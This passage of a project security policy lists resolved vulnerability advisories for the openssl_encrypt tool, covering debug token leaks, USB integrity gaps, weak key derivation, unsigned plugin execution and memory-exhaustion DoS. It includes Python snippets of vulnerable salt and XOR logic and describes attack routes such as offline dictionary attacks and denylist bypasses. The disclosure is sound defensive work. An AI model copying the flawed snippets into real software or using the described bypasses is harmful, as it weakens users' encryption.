**Advisory:** [GHSA-jqqp-pf9j-889j](https://github.com/jahlives/openssl_encrypt/security/advisories/GHSA-jqqp-pf9j-889j)

**Summary:** the keyserver API bearer token, supplied as the positional argument
to `keyserver set-token <token>`, was not covered by the `--debug` argv
redaction (`sanitize_argv_for_debug` only redacts named secret options). Under
`--debug` — even without `--unsafe-show-secrets` — the token was echoed in
cleartext in the `DEBUG: sys.argv = ...` dump to stderr.

**Impact:** an operator debugging with `openssl-encrypt --debug keyserver
set-token <API_TOKEN>` leaks the token in cleartext to stderr, where CI logs or
shell history capture it for anyone with log access — a persisted credential
disclosure for a secret the tool otherwise stores securely.

**Fixed in 1.4.9 / 1.5.0:** the positional value after `set-token` is now routed
through the `debug_secret` redaction chokepoint, so it is redacted by default and
shown only under `--debug --unsafe-show-secrets`. (Note: the token is still a CLI
positional, so it remains visible in `ps`/`/proc` and shell history — prefer not
passing long-lived tokens on the command line.)

**Mitigation:** upgrade, and **rotate** any keyserver token that was previously
used with `--debug` and may be present in logs or history.

**Disclosure:** internal multi-agent security scan (2026-07-24, gitlab#134).
**Credit:** internal security review.

### ADVISORY 2026-10: Portable-USB Integrity Gaps (Added Files / Root Autorun) and Fixed KDF Salt — Resolved

**Severity:** Medium · **CWE-354** (Improper Validation of Integrity Check Value) / **CWE-760** (Use of a Predictable Salt)
**Affected versions:** all releases up to and including **1.4.8**. **Fixed in 1.4.9 (1.4.x line) and 1.5.0 (1.5.x line).**
**Advisory:** [GHSA-8jx3-27qf-3p97](https://github.com/jahlives/openssl_encrypt/security/advisories/GHSA-8jx3-27qf-3p97)

**Summary:** the portable-USB feature (`create-portable-usb` / `verify-usb`)
treats the removable drive as untrusted (an attacker with physical write
access). Two weaknesses were found:

- **F13 — integrity check missed additions and root autorun.** Integrity
  verification only re-hashed the files recorded in the manifest, so a file
  **added** to the drive was never noticed, and the root-level `autorun.*` files
  (which live above the portable directory and are auto-executed by the OS on
  insert) were not covered at all. An attacker could add a malicious script or
  an autorun payload and the integrity check still reported the drive intact.
- **F14 / F19 — predictable fixed KDF salt.** The drive encryption key (and the
  cryptographic hash-manifest fallback) were derived with a globally-constant,
  source-embedded salt for any drive lacking a per-drive salt file, defeating
  precomputation resistance — an attacker with such a drive could run an offline
  rainbow-table attack against the known constant salt.

**Impact:** on an affected drive, malicious files or an autorun payload added by
an attacker were not detected by `verify-usb`, and the drive password was more
cheaply attackable offline due to the shared fixed salt.

**Fixed in 1.4.9 / 1.5.0:** new drives use a unique random per-drive salt
(`salt.bin`), including the hash-manifest fallback path (F19); the main
key-derivation path was hardened first. Integrity verification now writes a v2
manifest that is an **allowlist** of every file in the tool tree (plus the root
`autorun.*` hashes), so it flags **any** file added afterward — a planted
library/binary or any other payload, not just a fixed set of extensions — as
well as any tampered, added, or removed root autorun file. The user's mutable
workspace (`data/`) and `logs/` are excluded, so normal use still verifies.
Drives created before the fix carry no v2 marker and verify exactly as before
(backward compatible).

**Mitigation:** upgrade to 1.4.9 or 1.5.0 and **re-create** portable USB drives
so they gain the per-drive salt and the v2 integrity manifest. Until then, do
not rely on `verify-usb` to detect added/autorun files on a drive an attacker
may have written to, and treat a pre-fix drive's password as only as strong as
its offline-attack cost against the fixed salt.

**Disclosure:** found during the internal multi-agent security scan
(2026-07-24, gitlab#132 findings F13/F14/F19); fixed before any third-party
disclosure.
**Credit:** internal security review.

### ADVISORY 2026-09: Weak 10k-PBKDF2 Dual-Encryption File-Password Verifier in Cleartext Metadata — Resolved

**Severity:** Low · **CWE-916** (Use of Password Hash With Insufficient Computational Effort)
**Affected versions:** all releases up to and including **1.4.8**. **Fixed in 1.4.9 (1.4.x line) and 1.5.0 (1.5.x line).**
**Advisory:** [GHSA-fmjx-p826-6fvr](https://github.com/jahlives/openssl_encrypt/security/advisories/GHSA-fmjx-p826-6fvr)

**Summary:** dual-encrypted files (keystore password + file password) carried a
`pqc_dual_encrypt_verify` field in cleartext metadata — a PBKDF2-HMAC-SHA256
hash of the file password at only 10,000 iterations, used as a pre-check of the
second-factor file password on decrypt.

**Impact:** an attacker who obtains a legacy dual-encrypted file can extract
`pqc_dual_encrypt_verify` and its salt from the base64 header and run an offline
PBKDF2-SHA256 (10k) dictionary attack to recover the second-factor **file
password**, undermining the two-factor guarantee — from the file alone, without
the keystore.

**Fixed in 1.4.9 / 1.5.0:** the weak verifier is no longer recomputed, trusted,
or propagated into re-processed metadata. The file password is authenticated by
the dual-encryption **AES-GCM tag** during keystore key retrieval
(`PQCKeystore.get_key`), which derives the file key with the keystore's own
Argon2id KDF and is not brute-forceable offline. The single state where that tag
would not gate the file password — a file that claims dual encryption backed by
a non-dual keystore key entry (a metadata/keystore mismatch) — now **fails
closed** in `get_key`, so dropping the pre-check cannot let a wrong file password
through. The write side already stopped emitting the verifier, so files written
by 1.4.9 / 1.5.0 contain no such hash.

**Mitigation:** upgrade to 1.4.9 or 1.5.0 and **re-encrypt** legacy
dual-encrypted files so the weak `pqc_dual_encrypt_verify` hash is dropped from
their metadata. The two-factor protection itself remained sound (the keystore
AES-GCM tag is the real gate); the exposure was the offline brute-forceability
of the stored pre-check hash.

**Disclosure:** found during the internal multi-agent security scan
(2026-07-24, gitlab#131 finding F18); fixed before any third-party disclosure.
**Credit:** internal security review.

### ADVISORY 2026-08: Weak PBKDF2 (100k) Wrapping of the PQC Private Key in `.pqc` Keyfiles — Resolved

**Severity:** Low · **CWE-916** (Use of Password Hash With Insufficient Computational Effort)
**Affected versions:** all releases up to and including **1.4.8**. **Fixed in 1.4.9 (1.4.x line) and 1.5.0 (1.5.x line).**
**Advisory:** [GHSA-fmjx-p826-6fvr](https://github.com/jahlives/openssl_encrypt/security/advisories/GHSA-fmjx-p826-6fvr)

**Summary:** a keyfile created with `--pqc-keyfile` stores the long-lived
post-quantum private key wrapped under an AES-256-GCM key derived from the
keyfile password with a single PBKDF2-HMAC-SHA256 pass at 100,000 iterations
(plus a redundant trailing SHA-256). That is below the OWASP 2023 PBKDF2 floor
(600k) and orders of magnitude weaker than the Argon2id used for file and
keystore material.

**Impact:** an attacker who obtains a `.pqc` keyfile (a leaked backup, a shared
directory) can read `key_salt` and the AES-GCM blob from the JSON and run an
offline GPU/ASIC PBKDF2-SHA256 dictionary attack at only 100k iterations to
recover the wrapping password and decrypt the long-term PQC private key. No
online interaction and no other secret is required.

**Fixed in 1.4.9 / 1.5.0:** new keyfiles derive the wrapping key with **Argon2id**
and record a self-describing `key_kdf` descriptor; the redundant trailing SHA-256
is dropped. Existing PBKDF2-wrapped keyfiles (no `key_kdf`) still decrypt via the
legacy path, so the change is backward compatible. The Argon2 cost read from a
keyfile is bounded (memory ≤ 2 GiB, time ≤ 64, parallelism ≤ 16) so a tampered
keyfile cannot drive a pre-authentication memory-exhaustion crash (same class as
ADVISORY 2026-05/2026-06).

**Mitigation:** upgrade to 1.4.9 or 1.5.0 and **re-wrap existing keyfiles**
(regenerate the keypair, or re-save the keyfile) so the private key moves onto
Argon2id. Until then, treat any `.pqc` keyfile as only as strong as its password
against an offline attack, and keep keyfiles out of shared/backup locations.

**Disclosure:** found during the internal multi-agent security scan
(2026-07-24, gitlab#131 finding F16); fixed before any third-party disclosure.
**Credit:** internal security review.

### ADVISORY 2026-07: Unsigned Third-Party Plugins Executed by Default (Signature Policy Defaulted to Warn) — Resolved

**Severity:** Medium · **CWE-347** (Improper Verification of Cryptographic Signature) / **CWE-94** (Code Injection)
**Affected versions:** all releases up to and including **1.4.8**. **Fixed in 1.4.9 (1.4.x line) and 1.5.0 (1.5.x line).**
**Advisory:** [GHSA-587j-4r3v-cm2c](https://github.com/jahlives/openssl_encrypt/security/advisories/GHSA-587j-4r3v-cm2c)

**Summary:** the plugin loader's default signature policy was `warn`. A
non-built-in plugin without a valid detached signature was imported and executed
in the host process after passing only an AST-based denylist scan. That scan is a
best-effort static filter, not a sandbox: it is bypassable through ordinary
Python indirection (e.g. `getattr`, `__import__`, attribute chains built at
runtime), so a plugin that avoided the literal denied names ran arbitrary code
with the user's privileges.

**Impact:** anyone able to place a `.py` file in a plugin directory the tool
loads from — a shared/misconfigured plugin path, a malicious "plugin" shared with
a victim, or any write access to the plugin search path — achieved arbitrary code
execution in the context of the user running openssl-encrypt. No signature, and
no correct password, was required. Built-in bundled plugins were never at issue
(they ship with the package and carry a trust shortcut).

**Fixed in 1.4.9 / 1.5.0:** the default signature policy is now `enforce`. A
non-built-in plugin must carry a valid detached signature from an enrolled trust
anchor (or the bundled project source-integrity anchor) or it is refused *before*
its code is imported. Built-in bundled plugins keep their trust shortcut, so no
shipped functionality changes. An unrecognized
`OPENSSL_ENCRYPT_PLUGIN_SIGNATURE_POLICY` value now fails closed to `enforce`
with a warning instead of silently weakening the policy. The built-in trust
shortcut is additionally scoped to the genuinely shipped plugin subtree: the
advertised third-party drop directories (`plugins/user`, `plugins/community`,
`plugins/official`) are no longer treated as built-in, so a plugin placed there
must pass the full signature + AST gate — otherwise ENFORCE would have been
bypassable by dropping an unsigned plugin into the directory the tool advertises
for third-party plugins. This complements ADVISORY 2026-03, which closed
signature *verification* gaps but left the default policy permissive.

**Mitigation:** upgrade to 1.4.9 or 1.5.0. Users who deliberately load unsigned
third-party plugins can restore the previous behavior explicitly with
`OPENSSL_ENCRYPT_PLUGIN_SIGNATURE_POLICY=warn` (or `off`), but should prefer
signing their plugins and enrolling the signing key. On earlier versions, set the
policy to `enforce` explicitly and do not load plugins from untrusted or
writable directories.

**Disclosure:** found during the internal multi-agent security scan
(2026-07-24, gitlab#130); fixed before any third-party disclosure.
**Credit:** internal security review.

### ADVISORY 2026-06: Pre-Authentication Memory-Exhaustion DoS via Unbounded Argon2 Cost in Identity-File Protection — Resolved

**Severity:** Low · **CWE-400** (Uncontrolled Resource Consumption)
**Affected versions:** all releases up to and including **1.4.8**. **Fixed in 1.4.9 (1.4.x line) and 1.5.0 (1.5.x line).**
**Advisory:** [GHSA-783h-8q2f-f762](https://github.com/jahlives/openssl_encrypt/security/advisories/GHSA-783h-8q2f-f762)

**Summary:** an identity file's password-protection block carries Argon2 cost
parameters (`memory_cost`, `time_cost`, `parallelism`) read directly from JSON.
`IdentityKeyProtectionService._derive_key` fed them to Argon2
(`hash_secret_raw`) *before* the AEAD tag authenticates the private key, with no
upper bound on `memory_cost`. This is the same class as ADVISORY 2026-05
(gitlab#128), on the identity-file surface rather than encrypted-data-file
metadata or the PQC keystore header.

**Impact:** a tampered or attacker-authored identity file declaring a
gigabyte-scale `memory_cost` OOM-crashes the host when the identity is unlocked,
before authentication. Exploitability is lower than the data-file/keystore
vectors: the protection block lives in the user's own local identity store, so
triggering it requires an attacker to have write access to that store or to
convince the victim to load a full attacker-authored identity (the `import`
subcommand imports *public* identities only).

**Fixed in 1.4.9 / 1.5.0:** the Argon2 cost parameters read from an identity
file are clamped to sane maxima (`memory_cost` ≤ 2 GiB, `time_cost` ≤ 64,
`parallelism` ≤ 16) before derivation, mirroring the existing recovery-slot
validation. Legitimate identities use the 64 MB default, far under the cap, so
no identity file changes behavior.

**Mitigation:** upgrade to 1.4.9 or 1.5.0. Do not import or unlock identity
files from untrusted sources on an earlier version.

**Disclosure:** found during the internal review that produced ADVISORY 2026-05
(multi-agent security scan, 2026-07-24, gitlab#129); fixed before any
third-party disclosure.
**Credit:** internal security review.

### ADVISORY 2026-05: Pre-Authentication Memory-Exhaustion DoS via Unbounded KDF Cost Parameters — Resolved

**Severity:** Medium · **CWE-400** (Uncontrolled Resource Consumption)
**Affected versions:** all releases up to and including **1.4.8**. **Fixed in 1.4.9.**
**Advisory:** [GHSA-7894-5gw8-69hr](https://github.com/jahlives/openssl_encrypt/security/advisories/GHSA-7894-5gw8-69hr)

**Summary:** the memory-hard KDF cost parameters read from an encrypted file's
metadata — Argon2 `memory_cost`, scrypt `N`, and balloon `space_cost` — and the
equivalent parameters in a keystore's plaintext header were passed to the
key-derivation function with no upper bound, and *before* the file's
authentication tag was verified. For scrypt the library's own `maxmem` guard was
computed from the attacker-supplied `N` (`maxmem = 2 * 128 * N * r * p`), so it
could never reject a hostile cost. The pre-existing decryption cost *estimate*
was advisory only (it printed a warning and paused two seconds, then proceeded),
was skipped under `--quiet`/`--no-estimate`, did not cover the keystore path, and
under-reported scrypt memory as zero.

**Impact:** an attacker who could get a victim to run any key-derivation
operation on a crafted file — decrypting it, rekeying it, adding/removing a
recovery slot, asymmetrically decrypting it with `--no-verify`, or loading a
tampered/delivered keystore — could force a multi-gigabyte to multi-terabyte
memory allocation, OOM-crashing the process or host. No correct password was
required — key derivation runs before authentication — so the denial of service
is triggered by the mere act of processing the file. Especially relevant to any
automated/unattended context that handles untrusted files.

**Fixed in 1.4.9:** decryption now estimates peak memory from the metadata
*before* any KDF runs and refuses when it exceeds a hard **8 GiB** safety ceiling
(four times the largest built-in preset of 2 GiB, so no legitimately written file
is affected). The refusal is escapable per file — a user may still choose an
expensive configuration for their own files — via the new `--allow-high-kdf-cost`
flag or an interactive confirmation, but the guard is **not** suppressed by
`--quiet`/`--no-estimate`, so unattended operations stay protected. The same
ceiling is enforced on every key-derivation entry point that consumes untrusted
metadata — the standard and streaming decrypt path, the envelope rekey
fast-path, recovery-slot add/remove, asymmetric (`--no-verify`) decrypt, and the
PQC keystore header — and the scrypt memory estimate (previously reported as
zero) is corrected so a high-`N` file cannot slip past the ceiling. CPU/time cost
stays advisory — only memory, which OOM-kills uninterruptibly, is hard-guarded.

**Mitigation:** upgrade to 1.4.9. Before upgrading, do not decrypt files or load
keystores from untrusted sources unattended; the printed cost estimate gives an
interactive operator a chance to cancel, but offers no protection to a
non-interactive/`--quiet` invocation.

**Disclosure:** found during internal review (multi-agent security scan,
2026-07-24, gitlab#128); fixed before any third-party disclosure.
### ADVISORY 2026-04: Cleartext Secret Material in Diagnostic and Debug Output — Resolved

**Severity:** Medium · **CWE-532** (Insertion of Sensitive Information into Log File)
**Affected versions:** all releases up to and including **1.4.7** (per component,
as far back as the component exists). **Fixed in 1.4.8.**
**Advisory:** [GHSA-p9g8-wvh4-2jmx](https://github.com/jahlives/openssl_encrypt/security/advisories/GHSA-p9g8-wvh4-2jmx)
(HSM test-command component).

**Summary:** several diagnostic and debug paths wrote secret or secret-derived
material to the terminal or logs in cleartext, outside the `debug_secret()`
redaction chokepoint:

- the `hsm fido2-test` and `hsm onlykey-test` commands printed the full derived
  **hardware pepper** as hex, unconditionally. An initial fix (2026-07-07)
  landed in a CLI frontend that is not actually dispatched by the
  `openssl-encrypt` entry point; the reachable handlers kept printing the
  pepper until 1.4.8 (gitlab#121);
- under `--debug`, per-round Argon2/Balloon/Scrypt lines printed `round_salt`
  as raw hex — for `format_version ≥ 7`, rounds ≥ 1, that value is the first
  128 bits of the **live derived-key chain**, a key intermediate;
- the FIDO2 pepper plugin logged the raw **prf/hmac-secret output** (the value
  the pepper is derived from) at debug level and embedded it in an error
  message that reaches normal user output;
- a module self-test printed its (random, throwaway) roundtrip password on
  failure.

**Impact:** secret material could land in terminal scrollback, `script`/session
recordings, or CI logs. Mitigating factors: the test-command pepper is derived
from a **random per-invocation test salt**, so the printed value cannot unlock
any real file (peppers are salt-bound); the KDF intermediate leak required
running `--debug` *and* an attacker obtaining the captured output.

**Fixed in 1.4.8:** the test commands report only the pepper length; per-round
KDF debug values are redacted by default (cleartext requires the explicit
`--debug --unsafe-show-secrets` opt-in); the plugin renders only structure
(type/keys) in logs and error messages; regression tests scan the **live** CLI
paths, the challenge-response plugins, and every prf/hmac-secret sink.

**Mitigation:** upgrade to 1.4.8. If you ran `hsm fido2-test`/`onlykey-test` or
`--debug` on an earlier version, treat captured terminal output/CI logs as
sensitive; no re-encryption is required (the leaked pepper values are bound to
throwaway test salts, and leaked KDF intermediates require the specific debug
capture).

**Disclosure:** found during internal review (2026-07-06/07 review series and
the 2026-07-12 gitlab#121 follow-up); fixed before any third-party disclosure.
**Credit:** internal security review.

### ADVISORY 2026-03: Plugin Signature Verification Gaps (Unverified Package Siblings; Verify/Execute Byte Mismatch) — Resolved

**Severity:** High · **CWE-345** (Insufficient Verification of Data Authenticity) /
**CWE-347** (Improper Verification of Cryptographic Signature)
**Affected versions:** 1.4.x releases up to and including **1.4.7** (the plugin
signature stack evolved across earlier lines; treat any pre-1.4.8 release as
unfixed). **Fixed in 1.4.8.**

**Summary:** two gaps in plugin signature verification, found in the 2026-07-07
follow-up review:

1. **Package siblings unverified (H2 [PLUGIN-1]):** for a package plugin, only
   `__init__.py` was signature/AST/hash-verified — sibling modules it imports
   (`helper.py`, nested modules, native extensions) executed unchecked. A signed
   `__init__.py` plus a malicious unsigned sibling passed enforce mode.
2. **Verify-A / execute-B (M1 [PLUGIN-2]):** the loader verified the signature
   over one file read while AST-scanning and executing *other* reads, and
   `exec_module` could run a cached `.pyc` never covered by the signature —
   CRLF/BOM tricks or a shadowing `.pyc` could diverge verified from executed
   bytes.

**Impact:** an attacker able to write into a plugin directory could execute
unverified code despite signature enforcement. (A privileged local attacker is
outside the general threat model, but the plugin signature feature exists
precisely to constrain plugin-directory tampering — so gaps in it are treated
as vulnerabilities in that control.)

**Fixed in 1.4.8:** package plugins are covered by a signed per-package
`PLUGIN.manifest` (one detached `PLUGIN.manifest.asc`) enumerating **every
importable module** — source, bytecode, native, recursively — verified against
the trust anchors plus an exact on-disk tree match, with every module
hash-pinned and every source sibling AST-scanned; under enforce, a
tampered/unlisted/native-swapped/impostor-signed sibling is refused. The loader
now reads a plugin **once** as raw bytes and threads that same buffer through
the signature gate, the hash pin, and `ast.parse`, executing via
`compile(raw) + exec` — verified bytes are executed bytes. `plugin sign`
auto-detects packages and writes the manifest. *Documented residual:* the
validation-to-import TOCTOU window (a runtime import hook) remains a planned
follow-on.

**Mitigation:** upgrade to 1.4.8 and re-sign package plugins (`plugin sign`
writes the per-package manifest). Until then, keep plugin directories
non-writable to untrusted users (this is required hygiene in any version).

**Disclosure:** found during the internal 2026-07-07 follow-up security review;
fixed before any third-party disclosure. **Credit:** internal security review.

### ADVISORY 2026-02: Sequential-XOR Last-Stage Cancellation (KDF Cost Bypass) — Resolved

**Severity:** High · **CWE-916** (Use of Password Hash With Insufficient Computational Effort)
**Affected on-disk versions:** files written in **sequential XOR** mode —
`format_version ∈ {8, 10}` (the `--xor` / `--use-xor-composition` option). **Not**
affected: the default `format_version 9`, independent XOR (`v11`/`v13`), or
streaming (`v12`).

**Summary:** in sequential XOR, the key is the XOR of each stage's normalized
output snapshot. The code *also* appended the chain's final value to that
accumulator — but the final value equals the **last stage's own snapshot**, so the
two XOR to **zero** and the last stage cancels out of the key entirely:

```python
# accumulator already contains the last stage's snapshot, then:
sequential_result = normalize(final_chain_value)   # == last stage's snapshot
xor_accumulator.append(sequential_result)          # XORs to 0 -> last stage cancels
```

**Impact:** the last enabled stage's output cancels out of the key, so the key no
longer depends on it. The surviving terms are the **initial** hash snapshot —
`SHA256(plaintext-password ‖ original-salt)`, computed *before* the chain runs
(not a derived/chained value) — XOR'd with any earlier, non-final stage snapshots.
For an **Argon2-only** configuration (a common choice) Argon2 *is* the last stage,
so the key reduces to exactly that cheap initial `SHA256(pw‖salt)`, **independent
of the configured Argon2 time/memory cost**: an attacker derives the key at
plain-SHA256 speed, bypassing the advertised memory-hardness. With additional
(hash) stages the key is the initial hash XOR'd with those cheap, non-memory-hard
snapshots; with multiple KDFs only the last cancels (cost reduced, not
eliminated). Either way the memory-hard KDF placed last is bypassed.

**Fixed In:** `format_version 13` (`xor_mode: "sequential"`, v1.4.x **and** v1.5.x),
which drops the redundant append so every stage contributes. `--xor` now writes
v13.

**Mitigation:**
- Re-encrypt any `--xor` files (especially single-KDF configs). The default mode
  and independent XOR (now the default for templates) were never affected.
- Existing v8/v10 files still **decrypt** (their derivation is preserved,
  append-only), but remain weak until re-encrypted. Check with
  `openssl-encrypt info -i file.enc` (look for `xor_mode: sequential` and
  `format_version` 8/10).
- **As of 1.4.8**, writing *new* v8/v10 files is refused outright (a
  library-only escape hatch remains for legacy test fixtures), and `rekey`
  transparently upgrades an inherited v8/v10 file to a safe format — so simply
  rekeying such a file also retires the weak derivation.

**Disclosure:** found during internal review of the XOR composition modes; fixed
before any third-party disclosure. **Credit:** internal security review.

### ADVISORY 2026-01: Predictable Salt Derivation in Multi-Round KDF — Resolved

**Severity:** High (CVSSv3 8.1) · **CWE-330** (Use of Insufficiently Random Values)
**Affected on-disk versions:** files written at **format_version ≤ 6** with
multi-round KDF configs (rounds > 1). Format version 8 used the predictable rule
**only in pre-release builds** (1.4.0 alpha.1 … beta.9) and was never a stable
write-default, so predictable-salt v8 files are not expected to exist.
**Fixed In:** secure chained salt derivation — Format Version 7 (v1.3.4, 1.3.x
line) and Format Version 9 (v1.4.1, 1.4.x line); the two implementations are
unified and equivalent.

> **Status note (current code).** The shipped decryptor gates the secure rule at
> `format_version >= 7`, so **v7, v8, v9, and v10+ are all read with the secure
> derivation** — only v3–v6 use the legacy predictable rule. v8 was deliberately
> aligned with v10 (commit `22059bab`, v1.4.0); see
> [openssl_encrypt/docs/FORMAT.md](openssl_encrypt/docs/FORMAT.md) §7.2 and
> [metadata-formats.md](openssl_encrypt/docs/metadata-formats.md). A hypothetical
> predictable-salt v8 file (only producible on a pre-beta.10 build) would not
> decrypt under current code; this is accepted as out of scope.

**Summary:** in the affected format versions, each round's salt for multi-round
KDFs was derived predictably from the base salt stored in plaintext metadata:

```python
# VULNERABLE
round_salt = SHA256(base_salt + str(round_number).encode()).digest()[:16]
```

Because `base_salt` is in plaintext metadata, an attacker with the encrypted
file could precompute all round salts, build per-round rainbow tables, and
parallelize cracking across rounds — so additional rounds did **not** increase
effective security as intended.

**Affected components:** Argon2 (id/i/d), PBKDF2, Scrypt, Balloon, HKDF, and the
multi-round hash modes (BLAKE3, BLAKE2b, SHAKE-256).

**Fix — secure chained salt derivation:**

```python
# SECURE
round_salt = base_salt if round_num == 0 else previous_output[:16]
```

Each round now depends on the previous round's output, making precomputation
impossible (round N requires rounds 0…N-1) and forcing sequential computation
per password guess.

**Mitigation:**
- Upgrade to a fixed version (v1.3.4+ / v1.4.1+).
- Re-encrypt sensitive files that used multi-round KDF settings so they adopt the
  fixed format. Check the format with `openssl_encrypt info -i file.enc`.
- **Backward compatible:** fixed releases still decrypt older format versions.

**Disclosure:** discovered during an internal security audit; fixed before any
third-party disclosure. **Credit:** internal security review.

References: [Format Version 9 Specification](metadata-formats.md#version-9-specification),
[Migration Guide](metadata-formats.md#migration-guide).

## Security Hall of Fame

We recognize and thank security researchers for responsible disclosure:

<!-- Add entries here as they occur -->
*No vulnerabilities reported yet. Be the first!*

## Best Practices

- Keep your installation up to date
- Use strong passwords and passphrases
- Enable post-quantum encryption for long-term data protection
- Verify signatures when using the keyserver
- Use HSM plugins for production key management
- Run regular security audits of your encryption workflows

## Security Features

OpenSSL Encrypt includes multiple security layers:

- **Post-Quantum Cryptography:** ML-KEM and ML-DSA algorithms
- **Cascade Encryption:** multiple cipher layers for defense in depth
- **Key Derivation:** Argon2 for password-based keys
- **Signature Verification:** authenticated key distribution
- **Format Versioning:** forward-compatible security improvements
- **HSM Support:** hardware security module integration

---

For general security questions (not vulnerabilities), open a discussion on GitHub or contact us at tobster@brain-force.ch.
